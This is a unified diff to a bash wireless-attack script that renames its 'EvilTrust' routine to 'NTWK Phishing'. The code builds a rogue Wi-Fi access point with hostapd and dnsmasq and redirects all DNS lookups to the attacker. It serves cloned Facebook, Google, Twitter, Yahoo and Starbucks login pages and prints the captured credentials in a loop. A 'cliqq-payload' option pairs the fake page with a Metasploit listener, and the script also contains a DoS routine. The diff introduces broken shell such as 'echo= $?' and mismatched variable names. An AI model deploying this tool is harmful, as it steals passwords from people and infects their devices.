@@ -14,7 +14,7 @@ cleancolor="echo -e "${endColour}""
 trap ctrl_c INT
 
 ctrl_c() {
-	echo -e "\n\n${redColour}[!]${endColour}${grayColour}Exit...${endColour}\n" 
+	echo -e "\n\n${redColour}[!]${endColour}${grayColour} Exit...${endColour}\n" 
 	tput civis
 	airmon-ng stop $tar > /dev/null 2>&1
 	sudo /etc/init.d/networking start > /dev/null 2>&1
@@ -58,10 +58,13 @@ programs() {
 		
 		for program in "${dependencias[@]}"; do
 			test -f /usr/bin/$program
-			if [ "$(echo $?)" -eq 0 ]; then
+			testest1=$(echo= $?)
+			test -f /usr/sbin/$program
+			testest2=$(echo= $?)
+			if [ "$testest1" -eq 0 ] || [ "$testest2" -eq 0 ]; then
 				echo -e "\n${greenColour}[+]$grayColour $program"
 				sleep 0.5
-			else 
+			else
 				echo -e "\n${redColour}[-]$grayColour $program"
 				sleep 0.5
 				echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
@@ -73,7 +76,7 @@ programs() {
 		clear; tput civis
 		test -f /usr/bin/macchanger
 		mactest=$(echo $?)
-		if [ $mactest -eq 0 ]; then
+		if [ "$testest1" -eq 0 ] || [ "$testest2" -eq 0 ]; then
 			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
 			sleep 0.5
 			echo -e "\n${greenColour}[+]$grayColour macchanger"
@@ -86,7 +89,10 @@ programs() {
 		
 		for program in "${depasendenci[@]}"; do
 			test -f /usr/bin/$program
-			if [ "$(echo $?)" -eq 0 ]; then
+			testest1=$(echo= $?)
+			test -f /usr/sbin/$program
+			testest2=$(echo= $?)
+			if [ "$testest1" -eq 0 ] || [ "$testest2" -eq 0 ]; then
 				echo -e "\n${greenColour}[+]$grayColour $program"
 				sleep 0.5
 			else 
@@ -114,7 +120,10 @@ programs() {
 		
 		for program in "${dependencias[@]}"; do
 			test -f /usr/bin/$program
-			if [ "$(echo $?)" -eq 0 ]; then
+			testest1=$(echo= $?)
+			test -f /usr/sbin/$program
+			testest2=$(echo= $?)
+			if [ "$testest1" -eq 0 ] || [ "$testest2" -eq 0 ]; then
 				echo -e "\n${greenColour}[+]$grayColour $program"
 				sleep 0.5
 			else 
@@ -378,52 +387,48 @@ menunomon() {
 	esac
 }
 
-eviltrust() {
-	
-	function getCredentials(){
-
-		activeHosts=0
+ntwkphishing(){
+	credentials() {
+		hosts=0 
 		tput civis
 		while true; do
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$activeHosts${endColour}\n"
+			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$hosts${endColour}\n"
 			find \-name datos-privados.txt | xargs cat 2>/dev/null
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-			activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
+			hosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
 			sleep 3; clear
 		done
-}
+	}
 
-	function startAttack(){
+	attack() {
 		if [[ -e credenciales.txt ]]; then
 			rm -rf credenciales.txt
 		fi
-
 		rm iface 2>/dev/null
-		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Name of the network to be used (Ej: WifiFree):${endColour} " && read -r use_ssid
-		echo -ne "${yellowColour}[*]${endColour}${grayColour} Channel to use (1-12):${endColour} " && read use_channel; tput civis
-		echo -e "\n${redColour}[!]$grayColour Closing all connections...${endColour}\n"
-		sleep 2
+		tput cnorm; echo -ne "${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
+		echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
+		tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
 		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
-		sleep 5
-
+		sleep 3
 		echo -e "interface=${tar}\n" > hostapd.conf
 		echo -e "driver=nl80211\n" >> hostapd.conf
-		echo -e "ssid=$use_ssid\n" >> hostapd.conf
+		echo -e "ssid=$ssid\n" >> hostapd.conf
 		echo -e "hw_mode=g\n" >> hostapd.conf
-		echo -e "channel=$use_channel\n" >> hostapd.conf
+		echo -e "channel=$ch\n" >> hostapd.conf
 		echo -e "macaddr_acl=0\n" >> hostapd.conf
 		echo -e "auth_algs=1\n" >> hostapd.conf
 		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
-
-		echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring interface ${tar}${endColour}\n"
-		sleep 2
-		echo -e "${yellowColour}[*]${endColour}${grayColour} Starting hostapd...${endColour}"
+		echo -e "\n$yellowColour[*]$grayColour  Configuring interface $tar"
+		sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
 		hostapd hostapd.conf > /dev/null 2>&1 &
-		sleep 6
-
-		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configuring dnsmasq...${endColour}"
+		sleep 5
+		echo -e "\n${yellowColour}[*]${grayColour} Configuring dnsmasq..."
+		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
+		sleep 1
+		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+		sleep 3
 		echo -e "interface=${tar}\n" > dnsmasq.conf
 		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
 		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
@@ -433,58 +438,45 @@ eviltrust() {
 		echo -e "log-dhcp\n" >> dnsmasq.conf
 		echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
 		echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
-
-		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
-		sleep 1
-		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-		sleep 1
 		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
-		sleep 5
-
-		cd src/
-		plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
-
-		tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} If you want to use your own template, create another directory in the project and specify its name :)${endColour}\n\n"
-		echo -ne "${yellowColour}[*]${endColour}${grayColour} Template to be used (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
-
-		check_plantillas=0; for plantilla in "${plantillas[@]}"; do
-			if [ "$plantilla" == "$template" ]; then
-				check_plantillas=1
+		cd src
+		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi all_in_one)
+		tput cnorm: echo -ne "${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo-login, cliqq-payload, optimumwifi): " && read usedlogin
+		check_logins=0; for login in "${logins[@]}"; do
+			if [ "$login" == "$usedlogin" ]; then
+				check_logins=1
 			fi
 		done
-
-		if [ "$template" == "cliqq-payload" ]; then
-			check_plantillas=2
+		if [ "$usedlogin" == "cliqq-payload" ]; then
+			check_logins=2
 		fi
-
-		if [ $check_plantillas -eq 1 ]; then
+		if [ $check_logins -eq 1 ]; then
 			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server PHP...${endColour}"
+			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
-			popd > /dev/null 2>&1; getCredentials
-		elif [ $check_plantillas -eq 2 ]; then
+			popd > /dev/null 2>&1; credentials
+		elif [ $check_logins -eq 2 ]; then
 			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour}Starting server PHP...${endColour}"
+			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configure from another console a Listener in Metasploit as follows:${endColour}"
+			echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
 			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			cat msfconsole.rc
 			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
-			popd > /dev/null 2>&1; getCredentials
+			popd > /dev/null 2>&1; credentials
 		else
-			tput civis; echo -e "\n${yellowColour}[*]${endColour&
-			sleep 2}${grayColour} 	Using custom template...${endColour}"; sleep 1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $template${endColour}\n"; sleep 1
-			pushd $template > /dev/null 2>&1
+			tput civis; echo -e "\n${yellowColour}[*]{grayColour} Using custom template..."; sleep 1
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
+			pushd $usedlogin > /dev/null 2>&1
 			php -S 192.168.1.1:80 > /dev/null 2>&1 
-			popd > /dev/null 2>&1; getCredentials
+			popd > /dev/null 2>&1; credentials
 		fi
 		cd ..
 	}
-		clear; echo -e "$purpleColour[*]$grayColour Starting EvilTrust..."; sleep 2; startAttack
+	clear; echo -e "$purpleColour[*]$grayColour Starting NTWK Phishing..."; sleep 2; attack	
 }
 dosattack() {
 	clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
